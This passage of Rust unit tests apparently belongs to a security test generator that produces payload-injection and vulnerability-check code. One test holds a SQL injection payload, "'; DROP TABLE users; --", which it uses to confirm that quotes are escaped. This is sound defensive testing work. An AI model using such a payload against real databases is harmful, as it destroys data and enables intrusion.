        assert!(code.contains("ALL string fields"));
    }

    #[test]
    fn test_generate_apply_payload_with_targets() {
        let code = SecurityTestGenerator::generate_apply_payload(&["name".to_string()]);
        assert!(code.contains("applySecurityPayload"));
        assert!(code.contains("target fields"));
    }

    #[test]
    fn test_generate_security_checks() {
        let code = SecurityTestGenerator::generate_security_checks();
        assert!(code.contains("checkSecurityResponse"));
        assert!(code.contains("vulnerabilityIndicators"));
        assert!(code.contains("POTENTIAL VULNERABILITY"));
    }

    #[test]
    fn test_payload_escaping() {
        let payloads = vec![SecurityPayload::new(
            "'; DROP TABLE users; --".to_string(),
            SecurityCategory::SqlInjection,
            "Drop table".to_string(),
        )];

        let code = SecurityTestGenerator::generate_payload_selection(&payloads, false);
        // Single quotes should be escaped
        assert!(code.contains("\\'"));
    }
}
